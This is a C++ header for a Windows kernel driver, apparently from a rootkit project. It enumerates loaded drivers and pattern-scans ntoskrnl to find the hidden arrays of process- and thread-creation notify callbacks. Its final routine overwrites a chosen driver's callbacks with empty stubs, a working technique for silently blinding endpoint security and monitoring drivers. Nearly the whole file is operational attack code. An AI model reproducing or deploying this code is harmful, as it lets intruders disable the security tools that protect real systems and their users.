#pragma once

#include <ntifs.h>
#include <wdf.h>
#include "Globals.hpp"
#include "WinTypes.hpp"
#include "MemoryUtils.hpp"

/**
 * @brief Enumerates loaded drivers by parsing the driver section inloadorder linked list
 */
VOID
BeEnumerateDrivers()
{
	PKLDR_DATA_TABLE_ENTRY Entry = (PKLDR_DATA_TABLE_ENTRY)(BeGlobals::diskDriverObject)->DriverSection;
	PKLDR_DATA_TABLE_ENTRY First = Entry;

	while ((PKLDR_DATA_TABLE_ENTRY)Entry->InLoadOrderLinks.Flink != First)
	{
		LOG_MSG("Driver: 0x%llx :: %ls\r\n", Entry->DllBase, Entry->BaseDllName.Buffer);
		Entry = (PKLDR_DATA_TABLE_ENTRY)Entry->InLoadOrderLinks.Flink;
	}
}

/*
 * @brief Returns the driver that contains the address passed as an argument.
 *
 * @param[in] Address The address to look up.
 *
 * @returns PKLDR_DATA_TABLE_ENTRY The driver entry containing the address, or NULL if not found.
 */
PKLDR_DATA_TABLE_ENTRY
BeGetDriverForAddress(_In_ UINT64 Address)
{
	PKLDR_DATA_TABLE_ENTRY Entry = (PKLDR_DATA_TABLE_ENTRY)(BeGlobals::diskDriverObject)->DriverSection;

	LOG_MSG("Looking for address: 0x%llx\r\n", Address);

	//
	// TODO: dirty hack to avoid bug
	//
	for (auto I = 0; I < 512; ++I)
	{
		UINT64 StartAddr = UINT64(Entry->DllBase);
		UINT64 EndAddr = StartAddr + UINT64(Entry->SizeOfImage);

		LOG_MSG("Looking for: %ls 0x%llx 0x%llx\r\n", Entry->BaseDllName.Buffer, StartAddr, EndAddr);

		if (Address >= StartAddr && Address < EndAddr)
		{
			return (PKLDR_DATA_TABLE_ENTRY)Entry;
		}

		Entry = (PKLDR_DATA_TABLE_ENTRY)Entry->InLoadOrderLinks.Flink;
	}

	return NULL;
}

/*
 * @brief Gets the address of the array where kernel callbacks are stored.
 *
 * 1) Resolves the private Psp* routine from the Ps* routine by looking for CALL or JMP instructions.
 * 2) Resolves the array of callbacks from the Psp* routine by looking for LEA r13 or LEA rcx instructions.
 *
 * @param[in] Type The type of callback to resolve.
 *
 * @return UINT64 The address of the callbackRoutine array.
 */
UINT64
BeGetKernelCallbackArrayAddr(_In_ CALLBACK_TYPE Type)
{
	BeEnumerateDrivers();
	PCHAR CallbackRoutineName;

	switch (Type)
	{
	case CreateProcessNotifyRoutine:
		CallbackRoutineName = "PsSetCreateProcessNotifyRoutine";
		break;
	case CreateThreadNotifyRoutine:
		CallbackRoutineName = "PsSetCreateThreadNotifyRoutine";
		break;
	default:
		LOG_MSG("Unsupported callback type\r\n");
		return NULL;
	}

	UINT64 CallbackRoutineAddr = 0;
	UINT64 PspCallbackRoutineAddr = 0;
	UINT64 CallbackRoutineArrayAddr = 0;

	if (Type == CreateProcessNotifyRoutine || Type == CreateThreadNotifyRoutine)
	{
		//
		// Resolve PsSetCreateXYZNotifyRoutine
		//
		CallbackRoutineAddr = (DWORD64)BeGetSystemRoutineAddress("ntoskrnl.exe", CallbackRoutineName);
		if (!CallbackRoutineAddr)
		{
			LOG_MSG("Failed to resolve set-notify routine\r\n");
			return NULL;
		}

		//
		// Now resolve PspSetCreateXYZNotifyRoutine
		// we look for CALL/JMP PspSetCreateXYZNotifyRoutine in the function assembly
		//
		for (INT I = 0; I < 500; ++I)
		{
			if ((*(BYTE*)(CallbackRoutineAddr + I) == ASM_CALL_NEAR)
				|| (*(BYTE*)(CallbackRoutineAddr + I) == ASM_JMP_NEAR))
			{
				//
				// Param for CALL is offset to our routine
				//
				LOG_MSG("Offset: 0x%llx\r\n", *(PUINT32*)(CallbackRoutineAddr + I + 1));
				UINT32 Offset = *(PUINT32)(CallbackRoutineAddr + I + 1);

				//
				// Add offset to addr of next instruction to get psp address
				//
				PspCallbackRoutineAddr = CallbackRoutineAddr + I + Offset + 5;
				break;
			}
		}

		if (!PspCallbackRoutineAddr)
		{
			LOG_MSG("Failed to resolve private setnotify routine\r\n");
			return NULL;
		}

		LOG_MSG("Private (psp) NotifyRoutine: 0x%llx\r\n", PspCallbackRoutineAddr);

		//
		// Now we resolve the array of callbacks
		// we look for LEA r13 or LEA rcx <addr of callbackArray>
		//
		for (INT I = 0; I < 500; ++I)
		{
			if ((*(BYTE*)(PspCallbackRoutineAddr + I) == ASM_LEA_R13_BYTE1 && *(BYTE*)(PspCallbackRoutineAddr + I + 1) == ASM_LEA_R13_BYTE2)
				|| (*(BYTE*)(PspCallbackRoutineAddr + I) == ASM_LEA_RCX_BYTE1 && *(BYTE*)(PspCallbackRoutineAddr + I + 1) == ASM_LEA_RCX_BYTE2))
			{
				//
				// Param for LEA is the address of the callback array
				//
				UINT32 Offset = *(PUINT32)(PspCallbackRoutineAddr + I + 3);

				//
				// Add ofset to next instruction to get callback array addr
				//
				CallbackRoutineArrayAddr = PspCallbackRoutineAddr + I + Offset + 7;
				break;
			}
		}

		if (!PspCallbackRoutineAddr)
		{
			LOG_MSG("Failed to resolve Array for callbacks\r\n");
			return NULL;
		}

		return CallbackRoutineArrayAddr;
	}

	return NULL;
}

/*
 * @brief Enumerates kernel callbacks set.
 *
 * @param[in] Type The type of callback to resolve.
 *
 * @returns ktd::vector<CALLBACK_DATA, PagedPool> Vector of callbacks.
 */
ktd::vector<CALLBACK_DATA, PagedPool>
BeEnumerateKernelCallbacks(_In_ CALLBACK_TYPE Type)
{
	auto Data = ktd::vector<CALLBACK_DATA, PagedPool>();

	//
	// Get address for the kernel callback array
	//
	auto ArrayAddr = BeGetKernelCallbackArrayAddr(Type);
	if (!ArrayAddr)
	{
		LOG_MSG("Failed to get array addr for kernel callbacks\r\n");
		return Data;
	}

	LOG_MSG("Array for callbacks: 0x%llx\r\n", ArrayAddr);

	//
	// TODO: max number
	//
	for (INT I = 0; I < 16; ++I)
	{
		//
		// get current address & align the addresses to 0x10 (https://medium.com/@yardenshafir2/windbg-the-fun-way-part-2-7a904cba5435)
		//
		PVOID CurrCallbackBlockAddr = (PVOID)(((UINT64*)ArrayAddr)[I] & 0xFFFFFFFFFFFFFFF0);
		if (!CurrCallbackBlockAddr)
			continue;

		//
		// cast to callback routine block
		//
		auto CurrCallbackBlock = *((EX_CALLBACK_ROUTINE_BLOCK*)CurrCallbackBlockAddr);

		//
		// Get function address
		//
		auto CallbackFunctionAddr = (UINT64)CurrCallbackBlock.Function;

		//
		// Get corresponding driver
		//
		auto Driver = BeGetDriverForAddress(CallbackFunctionAddr);

		//
		// If unbacked memory with no associated driver
		//
		if (Driver == NULL)
		{
			//
			// Print info
			//
			LOG_MSG("Callback: <Unbacked Memory>, 0x%llx\r\n", CallbackFunctionAddr);

			//
			// Create result struct
			//
			CALLBACK_DATA Pcc = {
				0,
				CallbackFunctionAddr,
				NULL
			};

			PWCH PwsUnbacked = L"Unbacked";
			memcpy(Pcc.driverName, PwsUnbacked, (wcslen(PwsUnbacked) + 1) * sizeof(WCHAR));

			//
			// add to results
			//
			Data.push_back(Pcc);
		}
		else
		{
			//
			// Calculate offset of function
			//
			auto Offset = CallbackFunctionAddr - (UINT64)(Driver->DllBase);

			//
			// Print info
			//
			LOG_MSG("Callback: %ls, 0x%llx + 0x%llx\r\n", Driver->BaseDllName.Buffer, (UINT64)Driver->DllBase, Offset);

			//
			// Create result struct
			//
			CALLBACK_DATA Pcc = {
				(UINT64)Driver->DllBase,
				Offset,
				NULL
			};

			memcpy(Pcc.driverName, Driver->BaseDllName.Buffer, (wcslen(Driver->BaseDllName.Buffer) + 1) * sizeof(WCHAR));

			//
			// Add to results
			//
			Data.push_back(Pcc);
		}
	}

	return Data;
}

/**
 * @brief Empty callback routine to be used for replacing other kernel callback routines with any code that you want to run.
 */
VOID
BeEmptyCreateProcessNotifyRoutine(
	_In_ HANDLE  ParentId,
	_In_ HANDLE  ProcessId,
	_In_ BOOLEAN Create
) {
	UNREFERENCED_PARAMETER(ParentId);
	UNREFERENCED_PARAMETER(ProcessId);
	UNREFERENCED_PARAMETER(Create);

	AutoLock<FastMutex> _lock(BeGlobals::CallbackLock);
}

/**
 * @brief Empty callback routine to be used for replacing other kernel callback routines with any code that you want to run.
 */
VOID
BeEmptyCreateThreadNotifyRoutine(
	_In_ HANDLE  ProcessId,
	_In_ HANDLE  ThreadId,
	_In_ BOOLEAN Create
) {
	UNREFERENCED_PARAMETER(ProcessId);
	UNREFERENCED_PARAMETER(ThreadId);
	UNREFERENCED_PARAMETER(Create);

	AutoLock<FastMutex> _lock(BeGlobals::CallbackLock);
}

/*
 * @brief Replaces kernel callbacks of a specific driver with empty callback routines.
 *
 * @param[in] TargetDriverModuleName Name of the driver whose callbacks should be replaced.
 * @param[in] Type The type of callback to replace.
 *
 * @return NTSTATUS Status of the operation.
 */
NTSTATUS
BeReplaceKernelCallbacksOfDriver(
	_In_ PWCH TargetDriverModuleName,
	_In_ CALLBACK_TYPE Type
) {
	LOG_MSG("Target: %S\n", TargetDriverModuleName);

	//
	// Get address for the kernel callback array
	//
	auto ArrayAddr = BeGetKernelCallbackArrayAddr(Type);
	if (!ArrayAddr)
	{
		LOG_MSG("Failed to get array addr for kernel callbacks\r\n");
		return STATUS_NOT_FOUND;
	}

	LOG_MSG("Array for callbacks: 0x%llx\r\n", ArrayAddr);

	//
	// TODO: max number
	//
	for (INT I = 0; I < 16; ++I)
	{
		//
		// Get callback array address & align the addresses to 0x10 (https://medium.com/@yardenshafir2/windbg-the-fun-way-part-2-7a904cba5435)
		//
		auto CurrCallbackBlockAddr = (PVOID)(((UINT64*)ArrayAddr)[I] & 0xFFFFFFFFFFFFFFF0);
		if (!CurrCallbackBlockAddr)
			continue;

		//
		// Cast to callback routine block
		//
		auto CurrCallbackBlock = *((EX_CALLBACK_ROUTINE_BLOCK*)CurrCallbackBlockAddr);

		//
		// Get function address
		//
		auto CallbackFunctionAddr = (UINT64)CurrCallbackBlock.Function;

		//
		// Get corresponding driver
		//
		auto Driver = BeGetDriverForAddress(CallbackFunctionAddr);

		if (!Driver)
		{
			LOG_MSG("Didnt find driver for callback\r\n");
			continue;
		}

		//
		// If it is the driver were looking for
		//
		if (wcscmp(Driver->BaseDllName.Buffer, TargetDriverModuleName) == 0)
		{
			//
			// Calculate offset of function
			//
			auto Offset = CallbackFunctionAddr - (UINT64)(Driver->DllBase);

			//
			// Print info
			//
			LOG_MSG("Replacing callback with empty callback: %ls, 0x%llx + 0x%llx\r\n", Driver->BaseDllName.Buffer, (UINT64)Driver->DllBase, Offset);

			auto AddrOfCallbackFunction = (ULONG64)CurrCallbackBlockAddr + sizeof(ULONG_PTR);

			{
				AutoLock<FastMutex> _lock(BeGlobals::CallbackLock);
				LONG64 OldCallbackAddress;

				//
				// Replace routine by empty routine
				//
				switch (Type)
				{
				case CreateProcessNotifyRoutine:
					OldCallbackAddress = InterlockedExchange64((LONG64*)AddrOfCallbackFunction, (LONG64)&BeEmptyCreateProcessNotifyRoutine);
					break;
				case CreateThreadNotifyRoutine:
					OldCallbackAddress = InterlockedExchange64((LONG64*)AddrOfCallbackFunction, (LONG64)&BeEmptyCreateThreadNotifyRoutine);
					break;
				default:
					LOG_MSG("Invalid callback type\r\n");
					return STATUS_INVALID_PARAMETER;
					break;
				}

				//
				// Save old callback to restore later upon unloading
				//
				BeGlobals::BeCallbacksToRestore.addrOfCallbackFunction[BeGlobals::BeCallbacksToRestore.length] = AddrOfCallbackFunction;
				BeGlobals::BeCallbacksToRestore.callbackToRestore[BeGlobals::BeCallbacksToRestore.length] = OldCallbackAddress;
				BeGlobals::BeCallbacksToRestore.callbackType[BeGlobals::BeCallbacksToRestore.length] = Type;
				BeGlobals::BeCallbacksToRestore.length++;
			}
		}
	}

	LOG_MSG("Kernel callbacks erased: %i\n", BeGlobals::BeCallbacksToRestore.length);
	return STATUS_SUCCESS;
}